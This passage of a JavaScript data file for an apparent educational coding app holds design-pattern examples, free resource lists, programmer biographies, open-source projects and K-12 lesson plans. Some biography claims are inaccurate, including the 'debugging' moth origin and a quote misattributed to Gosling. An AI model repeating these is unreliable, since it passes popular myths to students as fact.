      whatStudentsLearn: 'State machines. Why behavior should depend on state explicitly.',
    },
    {
      name: 'Command Pattern',
      category: 'Behavioral',
      problem: 'You want to wrap user actions as objects so you can queue, undo, or log them.',
      solution: 'Each action is a "command" object with execute() + undo() methods.',
      whenUse: 'Undo/redo systems. Action queues. Macro recording.',
      whenAvoid: 'For one-off simple actions.',
      code: 'class History {\n  constructor() {\n    this.commands = [];\n  }\n  \n  execute(command) {\n    command.execute();\n    this.commands.push(command);\n  }\n  \n  undo() {\n    const command = this.commands.pop();\n    if (command) command.undo();\n  }\n}\n\nclass AddTextCommand {\n  constructor(textArea, text) {\n    this.textArea = textArea;\n    this.text = text;\n  }\n  \n  execute() {\n    this.previousValue = this.textArea.value;\n    this.textArea.value += this.text;\n  }\n  \n  undo() {\n    this.textArea.value = this.previousValue;\n  }\n}\n\n// Usage:\nconst history = new History();\nconst textArea = document.querySelector("textarea");\nhistory.execute(new AddTextCommand(textArea, "Hello "));\nhistory.execute(new AddTextCommand(textArea, "World"));\nhistory.undo(); // Removes "World"',
      explanation: 'Each command knows how to execute + undo itself. The History just tracks them.',
      whatStudentsLearn: 'Reification of actions. Building undo functionality.',
    },
    {
      name: 'Iterator Pattern',
      category: 'Behavioral',
      problem: 'You want to iterate over a complex data structure without exposing its internal representation.',
      solution: 'Provide an iterator that the caller can use without knowing how data is stored.',
      whenUse: 'Custom collections. Anywhere you want to support `for...of`.',
      whenAvoid: 'For simple arrays — built-in iterators handle it.',
      code: 'class Range {\n  constructor(start, end, step = 1) {\n    this.start = start;\n    this.end = end;\n    this.step = step;\n  }\n  \n  [Symbol.iterator]() {\n    let current = this.start;\n    const end = this.end;\n    const step = this.step;\n    return {\n      next() {\n        if (current < end) {\n          const value = current;\n          current += step;\n          return { value, done: false };\n        }\n        return { value: undefined, done: true };\n      }\n    };\n  }\n}\n\nfor (const n of new Range(0, 10, 2)) {\n  console.log(n);\n}\n// Outputs: 0, 2, 4, 6, 8',
      explanation: 'Symbol.iterator makes the object iterable. `for...of` and spread work automatically.',
      whatStudentsLearn: 'JavaScript iteration protocol. How language features can be implemented.',
    },
  ];

  // ─── Free coding tools + resources (categorized) ──────────────────
  var FREE_RESOURCES = {
    'Learn to code (free)': [
      { name: 'freeCodeCamp', url: 'freecodecamp.org', what: '~3,000 hours of free curriculum + projects + certifications. Most-used learn-to-code site.', cost: 'Free' },
      { name: 'Khan Academy Computing', url: 'khanacademy.org/computing', what: 'Free interactive lessons in JavaScript, HTML/CSS, SQL, animations.', cost: 'Free' },
      { name: 'Codecademy (free tier)', url: 'codecademy.com', what: 'Interactive coding courses. Free tier covers basics; pro tier is paid.', cost: 'Free tier + $20/mo pro' },
      { name: 'CS50 (Harvard, on edX)', url: 'edx.org/course/cs50', what: 'Harvard\'s introductory CS course. Free to audit. Iconic.', cost: 'Free (or pay for certificate)' },
      { name: 'The Odin Project', url: 'theodinproject.com', what: 'Free full-stack web development curriculum.', cost: 'Free' },
      { name: 'Frontend Masters (limited free)', url: 'frontendmasters.com', what: 'Some courses free. Strong technical depth.', cost: 'Mostly paid' },
      { name: 'MDN Web Docs', url: 'developer.mozilla.org', what: 'Mozilla\'s reference docs for web development. The standard.', cost: 'Free' },
      { name: 'JavaScript.info', url: 'javascript.info', what: 'Modern JavaScript tutorial. Free + comprehensive.', cost: 'Free' },
      { name: 'CSS Tricks', url: 'css-tricks.com', what: 'Articles + reference for CSS techniques.', cost: 'Free' },
      { name: 'A11y Project', url: 'a11yproject.com', what: 'Accessibility best practices. Free + community-driven.', cost: 'Free' },
    ],
    'Code editors (free)': [
      { name: 'VS Code', url: 'code.visualstudio.com', what: 'Microsoft\'s free code editor. Most-used among professionals.', cost: 'Free' },
      { name: 'CodePen', url: 'codepen.io', what: 'In-browser HTML/CSS/JS playground. Easy to share.', cost: 'Free tier' },
      { name: 'CodeSandbox', url: 'codesandbox.io', what: 'In-browser editor for any web framework.', cost: 'Free tier' },
      { name: 'Replit', url: 'replit.com', what: 'Browser-based IDE supporting many languages. Free tier.', cost: 'Free tier' },
      { name: 'JSFiddle', url: 'jsfiddle.net', what: 'Simple in-browser code playground.', cost: 'Free' },
      { name: 'Atom (deprecated)', url: 'atom.io', what: 'Was a popular editor; GitHub deprecated it in 2022. VS Code replaced it.', cost: 'Free' },
      { name: 'Notepad++', url: 'notepad-plus-plus.org', what: 'Lightweight code editor for Windows. Good for simple needs.', cost: 'Free' },
      { name: 'Sublime Text', url: 'sublimetext.com', what: 'Fast, lightweight editor. Unlimited free trial (one nag per save).', cost: 'Free trial' },
    ],
    'Free hosting': [
      { name: 'GitHub Pages', url: 'pages.github.com', what: 'Free static hosting from a GitHub repo.', cost: 'Free' },
      { name: 'Netlify (free tier)', url: 'netlify.com', what: 'Static + serverless hosting. Generous free tier.', cost: 'Free tier' },
      { name: 'Vercel (free tier)', url: 'vercel.com', what: 'Modern hosting for Next.js + other frameworks.', cost: 'Free tier' },
      { name: 'Firebase Hosting (free tier)', url: 'firebase.google.com', what: 'Google\'s hosting + backend services. Free tier.', cost: 'Free tier' },
      { name: 'Surge.sh', url: 'surge.sh', what: 'One-line static site publishing.', cost: 'Free' },
      { name: 'Glitch', url: 'glitch.com', what: 'Code + host all in one. Great for prototypes.', cost: 'Free tier' },
    ],
    'Free APIs (kid-friendly)': [
      { name: 'Open-Meteo (weather)', url: 'open-meteo.com', what: 'Free weather API. No signup required.', cost: 'Free' },
      { name: 'REST Countries', url: 'restcountries.com', what: 'Country info — capital, currency, languages.', cost: 'Free' },
      { name: 'CatAPI', url: 'thecatapi.com', what: 'Random cat photos. Beginner-friendly.', cost: 'Free' },
      { name: 'DogAPI', url: 'dog.ceo/dog-api', what: 'Random dog photos.', cost: 'Free' },
      { name: 'JSONPlaceholder', url: 'jsonplaceholder.typicode.com', what: 'Fake REST API for prototyping. No signup.', cost: 'Free' },
      { name: 'PokéAPI', url: 'pokeapi.co', what: 'Pokémon data. Great for game-themed apps.', cost: 'Free' },
      { name: 'NASA APOD', url: 'api.nasa.gov', what: 'Astronomy Picture of the Day + other NASA data.', cost: 'Free with API key' },
      { name: 'Open Library', url: 'openlibrary.org/developers/api', what: 'Book metadata + search.', cost: 'Free' },
      { name: 'TheCocktailDB', url: 'thecocktaildb.com/api.php', what: 'Cocktail recipes.', cost: 'Free' },
      { name: 'TheMealDB', url: 'themealdb.com/api.php', what: 'Recipe + meal data.', cost: 'Free' },
      { name: 'Bored API', url: 'bored.api.boredom.dev', what: 'Suggests random activities. Beginner-friendly.', cost: 'Free' },
      { name: 'Public APIs list', url: 'github.com/public-apis/public-apis', what: 'Curated list of hundreds of free APIs.', cost: 'Free' },
    ],
    'Git + GitHub': [
      { name: 'GitHub', url: 'github.com', what: 'Primary code hosting + collaboration platform.', cost: 'Free for public + small private repos' },
      { name: 'GitHub Codespaces (free tier)', url: 'github.com/features/codespaces', what: 'Cloud-based dev environments.', cost: 'Free tier (60 hours/month)' },
      { name: 'Git Cheat Sheet', url: 'education.github.com/git-cheat-sheet-education.pdf', what: 'PDF reference for Git commands.', cost: 'Free' },
      { name: 'Pro Git book', url: 'git-scm.com/book/en/v2', what: 'Free comprehensive Git book.', cost: 'Free' },
      { name: 'Atlassian Git Tutorial', url: 'atlassian.com/git/tutorials', what: 'Free Git tutorials from Atlassian.', cost: 'Free' },
    ],
    'Design + assets': [
      { name: 'Figma', url: 'figma.com', what: 'Industry-standard design tool. Free for individuals.', cost: 'Free tier' },
      { name: 'Adobe XD (free tier)', url: 'adobe.com/products/xd.html', what: 'Adobe\'s design tool. Free tier available.', cost: 'Free tier' },
      { name: 'Canva', url: 'canva.com', what: 'Design tool for non-designers. Free tier.', cost: 'Free tier' },
      { name: 'Unsplash', url: 'unsplash.com', what: 'Free high-quality stock photos.', cost: 'Free' },
      { name: 'Pixabay', url: 'pixabay.com', what: 'Free photos + illustrations + vectors.', cost: 'Free' },
      { name: 'Pexels', url: 'pexels.com', what: 'Free stock photos + videos.', cost: 'Free' },
      { name: 'Google Fonts', url: 'fonts.google.com', what: 'Free web fonts.', cost: 'Free' },
      { name: 'Heroicons', url: 'heroicons.com', what: 'Free MIT-licensed icons.', cost: 'Free' },
      { name: 'Lucide', url: 'lucide.dev', what: 'Free, beautiful icon set.', cost: 'Free' },
      { name: 'IconJam', url: 'iconjam.com', what: 'Free icon packs.', cost: 'Free' },
      { name: 'Coolors (color palettes)', url: 'coolors.co', what: 'Generate + browse color palettes.', cost: 'Free tier' },
      { name: 'Adobe Color', url: 'color.adobe.com', what: 'Adobe\'s color tool. Generate palettes from images.', cost: 'Free' },
      { name: 'Type Scale', url: 'typescale.com', what: 'Generate consistent font sizes.', cost: 'Free' },
    ],
    'Accessibility testing': [
      { name: 'WebAIM Contrast Checker', url: 'webaim.org/resources/contrastchecker', what: 'Check color contrast ratios.', cost: 'Free' },
      { name: 'Wave (browser ext)', url: 'wave.webaim.org', what: 'Browser-based + bookmarklet accessibility checker.', cost: 'Free' },
      { name: 'axe DevTools (browser ext)', url: 'deque.com/axe', what: 'Free accessibility audit in Chrome DevTools.', cost: 'Free' },
      { name: 'Lighthouse (Chrome built-in)', url: 'developer.chrome.com/docs/lighthouse', what: 'Performance + accessibility audit in Chrome DevTools.', cost: 'Free' },
      { name: 'NVDA (screen reader)', url: 'nvaccess.org', what: 'Free Windows screen reader. Use to test your app.', cost: 'Free' },
      { name: 'VoiceOver (Mac)', url: 'help.apple.com/voiceover', what: 'Mac built-in screen reader. Use to test your app.', cost: 'Free (built-in)' },
      { name: 'TalkBack (Android)', url: 'support.google.com/accessibility/android', what: 'Android built-in screen reader.', cost: 'Free (built-in)' },
      { name: 'WCAG 2.1 quick reference', url: 'w3.org/WAI/WCAG21/quickref', what: 'Official WCAG checklist.', cost: 'Free' },
    ],
    'Documentation + writing': [
      { name: 'Markdown reference', url: 'commonmark.org', what: 'Markdown syntax reference.', cost: 'Free' },
      { name: 'GitHub Flavored Markdown', url: 'github.github.com/gfm', what: 'GitHub\'s Markdown extensions.', cost: 'Free' },
      { name: 'Diátaxis', url: 'diataxis.fr', what: 'Framework for structuring technical documentation.', cost: 'Free' },
      { name: 'Write the Docs', url: 'writethedocs.org', what: 'Community + guides for technical writers.', cost: 'Free' },
    ],
    'Community + help': [
      { name: 'Stack Overflow', url: 'stackoverflow.com', what: 'Q+A site for programming.', cost: 'Free' },
      { name: 'Reddit r/learnprogramming', url: 'reddit.com/r/learnprogramming', what: 'Beginner-friendly programming community.', cost: 'Free' },
      { name: 'dev.to', url: 'dev.to', what: 'Community blogging platform for developers.', cost: 'Free' },
      { name: 'Hashnode', url: 'hashnode.com', what: 'Developer blogging platform.', cost: 'Free' },
      { name: 'CodeNewbie podcast', url: 'codenewbie.org', what: 'Podcast for new programmers.', cost: 'Free' },
      { name: 'Discord communities (various)', url: 'discord.com', what: 'Many programming communities are on Discord.', cost: 'Free' },
    ],
  };

  // ─── Famous programmers + their contributions ─────────────────────
  var FAMOUS_PROGRAMMERS = [
    {
      name: 'Ada Lovelace (1815-1852)',
      contribution: 'Wrote the first computer algorithm — an algorithm for computing Bernoulli numbers — for Charles Babbage\'s Analytical Engine, before computers existed.',
      legacy: 'Often called the world\'s first programmer. The Ada programming language is named after her. December 2nd is Ada Lovelace Day, celebrating women in STEM.',
      significance: 'Recognized the potential of computers beyond mere calculation. Predicted music composition + image generation. Her notes are some of the first descriptions of what we now call software.',
      quote: '"The Analytical Engine has no pretensions whatever to originate anything. It can do whatever we know how to order it to perform."',
      ageRange: 'K-12 inspirational figure',
    },
    {
      name: 'Alan Turing (1912-1954)',
      contribution: 'Defined the mathematical model of computation (Turing Machine). Broke the German Enigma code in WWII. Defined the Turing Test for AI.',
      legacy: 'Father of theoretical computer science + AI. The Turing Award (computing\'s Nobel) is named after him.',
      significance: 'His work is the foundation of all modern computing. Without Turing, no algorithms theory. Without algorithms theory, no software industry.',
      quote: '"We can only see a short distance ahead, but we can see plenty there that needs to be done."',
      ageRange: 'HS + above (some tragedy in his story may be heavy)',
    },
    {
      name: 'Grace Hopper (1906-1992)',
      contribution: 'Developed the first compiler (a program that translates human-readable code into machine code). Helped create COBOL.',
      legacy: 'The term "debugging" comes from her — she literally removed a moth from a computer relay in 1947. A US Navy ship is named after her.',
      significance: 'Made high-level programming accessible. Without compilers, programmers would have to write in raw machine code.',
      quote: '"The only way to do everything is just do something."',
      ageRange: 'K-12 inspirational figure',
    },
    {
      name: 'Margaret Hamilton (1936-)',
      contribution: 'Led the team that developed flight software for NASA\'s Apollo program. Coined the term "software engineering."',
      legacy: 'Awarded the Presidential Medal of Freedom (2016). Her code took humans to the moon.',
      significance: 'Demonstrated that "software engineering" deserved professional status. Without her, the Apollo program would have failed.',
      quote: '"Looking back, we were the luckiest people in the world; there was no choice but to be pioneers."',
      ageRange: 'K-12 inspirational figure',
    },
    {
      name: 'Tim Berners-Lee (1955-)',
      contribution: 'Invented the World Wide Web in 1989. Created HTML, HTTP, the first browser, and the first web server.',
      legacy: 'Knighted for his contributions. Founded the World Wide Web Consortium (W3C). Continues to advocate for the open web.',
      significance: 'Made information accessible globally. The web is now used by billions of people.',
      quote: '"The Web is more a social creation than a technical one."',
      ageRange: 'MS + above',
    },
    {
      name: 'Linus Torvalds (1969-)',
      contribution: 'Created the Linux kernel (open-source operating system used in servers + Android phones). Created Git (version control used worldwide).',
      legacy: 'Linux powers most of the internet + Android. Git is the standard for code collaboration.',
      significance: 'Demonstrated that open-source projects can succeed at massive scale.',
      quote: '"Talk is cheap. Show me the code."',
      ageRange: 'HS + above',
    },
    {
      name: 'Brian Kernighan (1942-) + Dennis Ritchie (1941-2011)',
      contribution: 'Co-authored the foundational book on C programming. Ritchie also invented the C language + Unix operating system.',
      legacy: 'C influenced most modern languages. Unix philosophy shaped how software is built.',
      significance: 'C is among the most influential programming languages ever. Most modern OSes + tools have C ancestry.',
      quote: '"Hello, World!" — first program in their book, the iconic intro to programming.',
      ageRange: 'HS + above',
    },
    {
      name: 'Hedy Lamarr (1914-2000)',
      contribution: 'Hollywood actress who also patented frequency-hopping spread spectrum technology — the basis of WiFi, GPS, and Bluetooth.',
      legacy: 'Inducted into the National Inventors Hall of Fame (2014). Demonstrated that anyone can be an inventor.',
      significance: 'Without her work, modern wireless communication would look very different.',
      quote: '"Films have a certain place in a certain time period. Technology is forever."',
      ageRange: 'K-12 inspirational figure',
    },
    {
      name: 'Brendan Eich (1961-)',
      contribution: 'Created JavaScript in 10 days at Netscape in 1995.',
      legacy: 'JavaScript is now the most used programming language in the world. Eich co-founded Mozilla.',
      significance: 'JavaScript powers most interactive web experiences. Its dominance was not predicted.',
      quote: '"Always bet on JavaScript."',
      ageRange: 'HS + above',
    },
    {
      name: 'Guido van Rossum (1956-)',
      contribution: 'Created Python in 1991. Maintained it for decades as "Benevolent Dictator for Life" until stepping down in 2018.',
      legacy: 'Python is among the most-used languages, especially in data science + machine learning.',
      significance: 'Demonstrated that thoughtful language design matters. Python\'s emphasis on readability shaped modern programming.',
      quote: '"Readability counts."',
      ageRange: 'HS + above',
    },
    {
      name: 'Donald Knuth (1938-)',
      contribution: 'Wrote "The Art of Computer Programming" (multi-volume foundational CS text). Created TeX typesetting system.',
      legacy: 'Knuth\'s work is the rigorous foundation of algorithm analysis. TeX is the gold standard for math typesetting.',
      significance: 'Set the standard for academic rigor in CS. His Big-O notation analysis methods are universal.',
      quote: '"Premature optimization is the root of all evil."',
      ageRange: 'HS + above',
    },
    {
      name: 'Aaron Swartz (1986-2013)',
      contribution: 'Co-developed RSS, Markdown, + early Reddit. Activist for open access to information.',
      legacy: 'Tragically died at 26, after federal charges related to downloading academic papers. His work + advocacy continue to influence open-internet culture.',
      significance: 'Demonstrated the tension between intellectual property law + open knowledge.',
      quote: '"With each technological development, the internet is brought one step closer to its inevitability."',
      ageRange: 'HS + above (story contains tragedy)',
    },
    {
      name: 'Anita Borg (1949-2003)',
      contribution: 'Computer scientist + founder of the Anita Borg Institute (now AnitaB.org) supporting women in technology.',
      legacy: 'The Grace Hopper Celebration of Women in Computing carries her vision. Many women in tech today were supported by her advocacy.',
      significance: 'Demonstrated that diversifying tech requires systemic support, not just individual effort.',
      quote: '"I want every girl child to grow up believing she can be whatever she wants to be."',
      ageRange: 'K-12 inspirational figure',
    },
    {
      name: 'James Gosling (1955-)',
      contribution: 'Created the Java programming language at Sun Microsystems in 1995.',
      legacy: 'Java runs on billions of devices. "Write once, run anywhere" was a paradigm shift.',
      significance: 'Demonstrated that platform-independence is a major design constraint worth solving.',
      quote: '"Java is to JavaScript what car is to carpet."',
      ageRange: 'HS + above',
    },
    {
      name: 'Jeff Bezos (founder of AWS), Larry Page + Sergey Brin (Google), Steve Jobs (Apple)',
      contribution: 'Industry figures who built foundational tech companies. Not pure programmers, but their decisions shaped what programmers build for.',
      legacy: 'AWS made cloud computing possible. Google made information universally accessible. Apple defined consumer technology.',
      significance: 'These individuals demonstrate that great engineers also need great judgment about what to build.',
      quote: '"The only way to do great work is to love what you do." — Steve Jobs',
      ageRange: 'HS + above',
    },
  ];

  // ─── Open source / community projects worth contributing to ───────
  var OPEN_SOURCE_PROJECTS = [
    { name: 'freeCodeCamp', url: 'github.com/freeCodeCamp/freeCodeCamp', what: 'Free coding curriculum used by millions. Always needs content + bug fixes.', goodFor: 'Beginner-friendly. Web devs. Educators.', whyContribute: 'Help others learn to code while improving your own skills.' },
    { name: 'MDN Web Docs', url: 'github.com/mdn/content', what: 'Mozilla\'s docs for HTML, CSS, JS. The most-used dev reference.', goodFor: 'Strong writers + readers. Anyone who notices errors.', whyContribute: 'Improve developer experience for millions.' },
    { name: 'Wikipedia (technology articles)', url: 'wikipedia.org', what: 'World\'s largest encyclopedia. Tech articles need ongoing updates.', goodFor: 'Strong writers + researchers.', whyContribute: 'Information that millions rely on.' },
    { name: 'Linux Kernel', url: 'github.com/torvalds/linux', what: 'The kernel that powers most internet servers + Android. Highly technical.', goodFor: 'Advanced systems programmers.', whyContribute: 'Foundational infrastructure.' },
    { name: 'Inkscape (vector graphics)', url: 'inkscape.org', what: 'Free SVG editor. Always needs contributors.', goodFor: 'Designers + visual developers.', whyContribute: 'Free Adobe Illustrator alternative for the world.' },
    { name: 'Krita (digital painting)', url: 'krita.org', what: 'Free digital painting app. Strong contributor culture.', goodFor: 'Artists who code, or developers who paint.', whyContribute: 'Free Photoshop alternative for artists.' },
    { name: 'Audacity (audio editing)', url: 'audacityteam.org', what: 'Free audio editor + recorder.', goodFor: 'Audio enthusiasts. Music producers.', whyContribute: 'Empowering podcasters + musicians.' },
    { name: 'Blender (3D modeling)', url: 'blender.org', what: 'Free 3D modeling + animation. Used by Pixar + many studios.', goodFor: 'Artists who code. 3D developers.', whyContribute: 'Free professional-grade 3D tool for the world.' },
    { name: 'Local libraries\' digital projects', url: 'varies', what: 'Many libraries have digitization projects + open APIs.', goodFor: 'Anyone interested in libraries + open data.', whyContribute: 'Preserve cultural heritage + democratize access.' },
    { name: 'OpenStreetMap', url: 'openstreetmap.org', what: 'Free alternative to Google Maps. Contributors map their own neighborhoods.', goodFor: 'Anyone with local knowledge. Data lovers.', whyContribute: 'Free map data for the world.' },
    { name: 'Project Gutenberg', url: 'gutenberg.org', what: 'Digitized public-domain books. Always needs proofreaders + transcribers.', goodFor: 'Readers, librarians, transcribers.', whyContribute: 'Free literature for the world.' },
    { name: 'Citizen Science programs', url: 'scistarter.org', what: 'Real research projects that anyone can contribute to.', goodFor: 'Anyone with a phone or computer.', whyContribute: 'Real research data + science engagement.' },
    { name: 'Code.org', url: 'code.org', what: 'Free CS curriculum. Used in K-12 worldwide.', goodFor: 'Anyone who wants to teach coding.', whyContribute: 'Coding for every student.' },
    { name: 'Khan Academy (computing)', url: 'khanacademy.org/computing', what: 'Free programming courses. Always needs content + bug fixes.', goodFor: 'Educators + content creators.', whyContribute: 'Free education for the world.' },
    { name: 'Open Source Game projects', url: 'opensource.com/article/games', what: 'Many open-source games (0 A.D., OpenRA, etc.) need contributors.', goodFor: 'Game enthusiasts who code.', whyContribute: 'Free games + game development experience.' },
  ];

  // ─── Comprehensive lesson plans (CSTA + AP CSP aligned) ──────────
  // 15 full lesson plans for teaching coding with AppLab.
  var LESSON_PLANS = [
    {
      id: 'lesson_intro_to_apps',
      title: 'Lesson 1: What is an App, Really?',
      grade: '6-12',
      duration: '45 min',
      standards: ['CSTA 2-CS-02: Components of computing systems', 'AP CSP CRD-1.A'],
      objectives: [
        'Students will define what makes something an "app"',
        'Students will identify the parts of an app (UI, logic, data)',
        'Students will demonstrate using an app and reflect on its design',
      ],
      materials: 'Computer with AppLab access. Printable handout.',
      warmup: '5 min — Show 3 apps students use daily (TikTok, Google Docs, calculator). Discuss: what do these have in common? What\'s different?',
      mainActivity: '20 min — Students use AppLab to generate a simple app (e.g., calculator). Identify the parts: UI (what you see), Logic (what happens when you click), Data (what gets stored).',
      reflection: '10 min — Write 3 sentences: What is an app? What surprised you about how they\'re built?',
      assessment: 'Exit ticket: Identify the UI, Logic, and Data parts of a simple app.',
      udlAccommodations: [
        'Audio captions on AppLab',
        'Reduced-motion option',
        'Visual diagram of app parts as scaffold',
        'Pair early learners with stronger readers',
      ],
      extensions: 'Have students compare 2 different apps that solve the same problem. What design choices differ?',
    },
    {
      id: 'lesson_intro_html',
      title: 'Lesson 2: HTML — Structure of the Web',
      grade: '6-12',
      duration: '50 min',
      standards: ['CSTA 2-AP-13: Decompose problems', 'AP CSP CRD-2.A'],
      objectives: [
        'Students will identify basic HTML tags',
        'Students will create a simple HTML page',
        'Students will demonstrate semantic HTML use',
      ],
      materials: 'Computer with AppLab. HTML cheat sheet.',
      warmup: '5 min — Open a webpage. Right-click → Inspect. Look at the HTML. Discuss: this is the structure underneath.',
      mainActivity: '25 min — Build a personal "About Me" page using AppLab. Required: heading, paragraph, list, image. Bonus: navigation menu.',
      reflection: '10 min — Compare to a buddy\'s page. What makes for good structure? Why does it matter for assistive tech?',
      assessment: 'Self-assessment checklist of required HTML elements. Peer feedback on a partner\'s page.',
      udlAccommodations: [
        'Pre-printed HTML reference cards',
        'Pair English Learners with bilingual peers',
        'Allow audio/video instead of writing',
      ],
      extensions: 'Add CSS styling. Add a form for visitors to contact you.',
    },
    {
      id: 'lesson_intro_css',
      title: 'Lesson 3: CSS — Style and Layout',
      grade: '6-12',
      duration: '50 min',
      standards: ['CSTA 2-AP-13: Decompose', 'AP CSP CRD-2.B'],
      objectives: [
        'Students will use CSS to style HTML elements',
        'Students will identify the box model',
        'Students will demonstrate responsive design basics',
      ],
      materials: 'Computer with AppLab. CSS cheat sheet.',
      warmup: '5 min — Show two versions of same content: with + without styling. Discuss the difference.',
      mainActivity: '25 min — Style the About Me page from Lesson 2. Add colors, fonts, layout. Make it look professional.',
      reflection: '10 min — Pair-share: what stylistic choices did you make? How did you balance aesthetics with accessibility?',
      assessment: 'Required: at least 3 different colors, 2 fonts, 1 layout decision (flexbox or grid). WCAG color contrast check.',
      udlAccommodations: [
        'Provide CSS color palette suggestions',
        'Provide layout template options',
        'Color-blind palette presets',
      ],
      extensions: 'Add a dark mode toggle. Make it responsive (works on mobile + desktop).',
    },
    {
      id: 'lesson_intro_javascript',
      title: 'Lesson 4: JavaScript — Make It Interactive',
      grade: '7-12',
      duration: '50-60 min',
      standards: ['CSTA 2-AP-14: Functions', 'AP CSP AAP-2.B'],
      objectives: [
        'Students will write functions in JavaScript',
        'Students will use event handlers',
        'Students will manipulate the DOM',
      ],
      materials: 'Computer with AppLab. JS reference.',
      warmup: '5 min — Click a button on Google. What happens? Discuss: JS runs in your browser. It\'s how apps "respond."',
      mainActivity: '30 min — Add a button to the About Me page. When clicked, it changes the background color randomly. Or shows/hides additional content.',
      reflection: '10 min — Pair-share: what events did you handle? What other interactions could be useful?',
      assessment: 'Required: 1 working event handler + 1 DOM manipulation. Bonus: 2+ event handlers.',
      udlAccommodations: [
        'Pre-written code starter',
        'Step-by-step pictorial guide',
        'Allow voice-to-text for code comments',
      ],
      extensions: 'Add multiple buttons. Track click count. Add animation.',
    },
    {
      id: 'lesson_decomposition',
      title: 'Lesson 5: Decomposition — Break It Down',
      grade: '6-12',
      duration: '50 min',
      standards: ['CSTA 2-AP-13: Decompose', 'AP CSP CRD-2.A'],
      objectives: [
        'Students will decompose a complex problem into smaller parts',
        'Students will explain why decomposition matters',
        'Students will apply decomposition to design an app',
      ],
      materials: 'Computer with AppLab. Whiteboard/poster paper.',
      warmup: '5 min — Choose any complex task (making breakfast, riding a bike). Decompose into 5 steps. Decompose one step into 5 sub-steps.',
      mainActivity: '25 min — Pick an app from the Project Library. Decompose it: List the major parts. List sub-parts for each major part. Plan the app structure.',
      reflection: '10 min — Discuss in groups: which decompositions were similar? Which were different? Why?',
      assessment: 'Submit your decomposition diagram. Identify at least 3 major parts + 3 sub-parts each.',
      udlAccommodations: [
        'Provide example decomposition diagrams',
        'Allow drawn or written decompositions',
        'Pair early students with stronger planners',
      ],
      extensions: 'Implement one piece of your decomposition. Compare to your plan.',
    },
    {
      id: 'lesson_algorithms',
      title: 'Lesson 6: Algorithms — Step-by-Step Solutions',
      grade: '7-12',
      duration: '50-60 min',
      standards: ['CSTA 2-AP-10: Pseudocode', 'AP CSP AAP-2.B'],
      objectives: [
        'Students will write pseudocode for a simple algorithm',
        'Students will identify control flow patterns',
        'Students will trace through an algorithm step-by-step',
      ],
      materials: 'Computer with AppLab. Pseudocode worksheet.',
      warmup: '5 min — Write a "recipe" for making a peanut butter sandwich. Have a partner follow your instructions LITERALLY. Discuss precision.',
      mainActivity: '30 min — Pick a problem (e.g., find largest number in a list). Write pseudocode. Trace through with sample input. Then implement in AppLab.',
      reflection: '10 min — Discuss: what pseudocode worked? What didn\'t? Why is precision important?',
      assessment: 'Submit pseudocode + working implementation. Trace through with at least 2 different inputs.',
      udlAccommodations: [
        'Pseudocode template provided',
        'Pair with stronger reader for trace through',
        'Visual flowchart option',
      ],
      extensions: 'Compare 2 different algorithms for the same problem (e.g., linear search vs binary search). Discuss when each is better.',
    },
    {
      id: 'lesson_debugging',
      title: 'Lesson 7: Debugging — When Things Go Wrong',
      grade: '7-12',
      duration: '50 min',
      standards: ['CSTA 2-AP-17: Testing + refining', 'AP CSP CRD-2.B'],
      objectives: [
        'Students will identify the difference between syntax + logic errors',
        'Students will use console.log for debugging',
        'Students will apply systematic debugging strategies',
      ],
      materials: 'Computer with AppLab. Buggy code samples.',
      warmup: '5 min — Show code with a deliberate bug. Have students find it. Discuss the strategies they used.',
      mainActivity: '25 min — Use AppLab to fix 3 sample buggy programs (provided). Use console.log to trace through. Identify what was wrong.',
      reflection: '10 min — Discuss: which strategies worked? What did you learn about your own debugging style?',
      assessment: 'Fix 2 of 3 sample programs successfully. Submit explanations of the bugs.',
      udlAccommodations: [
        'Pre-printed debugging strategy checklist',
        'Allow pair-debugging',
        'Provide screenshots of expected output',
      ],
      extensions: 'Find a real bug in someone else\'s code (peer review). Document the bug + fix.',
    },
    {
      id: 'lesson_accessibility',
      title: 'Lesson 8: Accessibility — Building for Everyone',
      grade: '8-12',
      duration: '60 min',
      standards: ['CSTA 2-CS-03: Inclusive design', 'AP CSP IOC-1.B + IOC-1.C'],
      objectives: [
        'Students will identify WCAG 2.1 AA requirements',
        'Students will test their apps with assistive technology',
        'Students will fix common accessibility issues',
      ],
      materials: 'Computer with AppLab. WCAG checklist. Screen reader (VoiceOver/NVDA).',
      warmup: '5 min — Try to use a familiar app while: 1) screen off (audio only), 2) keyboard only (no mouse), 3) magnified 200%. Discuss frustrations.',
      mainActivity: '40 min — Take an existing app. Test with: 1) Keyboard only, 2) Screen reader, 3) High contrast mode, 4) Zoom 200%. Fix issues.',
      reflection: '10 min — Reflect: which issues were hardest to find? How does accessibility affect everyone?',
      assessment: 'WCAG checklist of fixes. Demo your app being used keyboard-only.',
      udlAccommodations: [
        'WCAG checklist provided',
        'Pair students who need to test from screen reader perspective',
        'Provide alternative for testing without screen reader software',
      ],
      extensions: 'Add a high-contrast mode. Add caption mode. Conduct WCAG audit of a public website.',
    },
    {
      id: 'lesson_apis',
      title: 'Lesson 9: APIs — Connecting to Other Systems',
      grade: '9-12',
      duration: '60 min',
      standards: ['CSTA 2-NI-04: Apps + APIs', 'AP CSP 4.B.1'],
      objectives: [
        'Students will explain what an API is',
        'Students will use fetch() to call a public API',
        'Students will handle API responses + errors',
      ],
      materials: 'Computer with AppLab. List of free public APIs.',
      warmup: '5 min — Open Google Maps. Notice the weather widget. Discuss: where does that data come from?',
      mainActivity: '40 min — Build an app that uses a public API (Open-Meteo for weather, REST Countries, etc.). Display the data nicely.',
      reflection: '10 min — Discuss: what APIs would you want to build? What\'s an API worth charging for?',
      assessment: 'Working app that calls + displays API data. Handle at least one error case (invalid input or network failure).',
      udlAccommodations: [
        'Provide a curated list of beginner-friendly APIs',
        'Pre-write the fetch boilerplate',
        'Provide screenshots of expected output',
      ],
      extensions: 'Compare 2 APIs that provide similar data. Which is faster? Better? Discuss the business model.',
    },
    {
      id: 'lesson_state_management',
      title: 'Lesson 10: State Management — Storing User Data',
      grade: '9-12',
      duration: '50 min',
      standards: ['CSTA 2-AP-13: Decompose', 'AP CSP DAT-1.A'],
      objectives: [
        'Students will use localStorage to persist data',
        'Students will structure data with objects + arrays',
        'Students will design data models',
      ],
      materials: 'Computer with AppLab.',
      warmup: '5 min — Visit a website. Then close + reopen browser. Why do some things stay (logged in) and some things reset?',
      mainActivity: '30 min — Build a To-Do list app that PERSISTS across browser refreshes (using localStorage).',
      reflection: '10 min — Discuss: what data should persist? What shouldn\'t (passwords)? Privacy concerns?',
      assessment: 'Working app with persistence. Data survives browser refresh.',
      udlAccommodations: [
        'Pre-written localStorage helper functions',
